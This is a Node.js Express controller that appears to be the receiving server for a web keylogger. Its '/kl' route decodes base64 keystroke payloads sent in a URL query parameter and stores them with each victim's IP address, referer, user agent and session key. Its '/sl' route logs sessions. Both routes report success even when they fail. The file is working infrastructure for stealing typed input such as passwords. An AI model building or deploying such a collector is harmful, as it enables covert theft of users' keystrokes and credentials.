const SessionLogModel = require( '../models/sessionLog.model' );
const keylogModel = require( '../models/keylog.model' );
const SessionLogDb = require( '../db/sessionLog.db' );
const KeylogDb = require( '../db/keylog.db' );
const Common = require( './common' );
const atob = require( 'atob' );

class RxController {
    constructor( router ) {
        router.route( '/sl' )
            .get( this.upsertSession )
        router.route( '/kl' )
            .get( this.upsertKeylog )
    }

    async upsertSession( req, res, next ) {
        try {
            const ip = req.connection.remoteAddress;
            const referer = req.get( 'Referrer' );
            const user_agent = req.get( 'User-Agent' );
            const payload = { session_key: req.body.session_key, ip, referer, user_agent };
            const data = await SessionLogDb.insertOrUpdateOne( payload );
            return Common.resultOk( res, null );
        } catch ( e ) {
            console.error(e);
            return Common.resultOk( res, null );
        }
    }

    async upsertKeylog( req, res, next ) {
        try {
            const payload = JSON.parse(atob(req.query.k));
            payload.session_key = atob(payload.session_key);
            payload.ip = req.connection.remoteAddress;
            payload.referer = req.get( 'Referrer' );
            payload.user_agent = req.get( 'User-Agent' );
            const sessionLog = await SessionLogDb.insertOrUpdateOne( payload );
            const data = await KeylogDb.insertOrUpdateOne( sessionLog.id, payload );
            return Common.resultOk( res, null );
        } catch ( e ) {
            console.error(e);
            return Common.resultOk( res, null );
        }
    }

    async getAllSessions( req, res, next ) {
        try {
            const data = await SessionLogDb.getAll();
            if ( data ) {
                const sessions = data.map( p => { return new SessionLogModel( p ) } );
                return Common.resultOk( res, sessions );
            } else {
                return Common.resultNotFound( res );
            }
        } catch ( e ) {
            console.error(e);
            return Common.resultErr( res, e.message );
        }
    }

    async getAllKeylogs( req, res, next ) {
        try {
            const data = await SessionLogDb.getAll();
            if ( data ) {
                const keylogs = data.map( p => { return new keylogModel( p ) } );
                return Common.resultOk( res, keylogs );
            } else {
                return Common.resultNotFound( res );
            }
        } catch ( e ) {
            console.error(e);
            return Common.resultErr( res, e.message );
        }
    }

}

module.exports = RxController;
